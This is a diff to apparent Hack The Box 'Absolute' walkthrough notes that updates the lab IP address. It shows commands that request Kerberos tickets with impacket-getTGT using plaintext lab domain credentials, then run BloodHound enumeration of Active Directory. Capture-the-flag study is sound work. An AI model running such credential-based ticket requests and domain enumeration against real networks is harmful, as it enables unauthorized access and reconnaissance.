@@ -38,19 +38,19 @@ SVC_SMB@ABSOLUTE.HTB : AbsoluteSMBService123!
 ```
       
 ```bash
-sed -i 's/10.129.138.0/NEW/g' Absolute-*.md
+sed -i 's/10.129.229.59/10.129.229.59/g' Absolute-*.md
 
-sudo sed -i 's/10.129.138.0/NEW/g' /etc/hosts
+sudo sed -i 's/10.129.229.59/10.129.229.59/g' /etc/hosts
 
-echo "10.129.138.0 dc.absolute.htb absolute.htb" | sudo tee -a /etc/hosts
+echo "10.129.229.59 dc.absolute.htb absolute.htb" | sudo tee -a /etc/hosts
 sudo ntpdate -s dc.absolute.htb
-impacket-getTGT -dc-ip 10.129.138.0 absolute.htb/d.klay:Darkmoonsky248girl
-impacket-getTGT -dc-ip 10.129.138.0 absolute.htb/SVC_SMB:AbsoluteSMBService123!
+impacket-getTGT -dc-ip 10.129.229.59 absolute.htb/d.klay:Darkmoonsky248girl
+impacket-getTGT -dc-ip 10.129.229.59 absolute.htb/SVC_SMB:AbsoluteSMBService123!
 # /opt/BloodHound.py/bloodhound.py
 # bloodhound-python
 # Beware docker container need to be sync to DC!
 
-KRB5CCNAME=d.klay.ccache $bloodhoundPythonInstallMethod -k -dc dc.absolute.htb -ns 10.129.138.0 -c all -d absolute.htb -u d.klay -p 'Darkmoonsky248girl' --zip
+KRB5CCNAME=d.klay.ccache $bloodhoundPythonInstallMethod -k -dc dc.absolute.htb -ns 10.129.229.59 -c all -d absolute.htb -u d.klay -p 'Darkmoonsky248girl' --zip
 ```
 
 VM requires
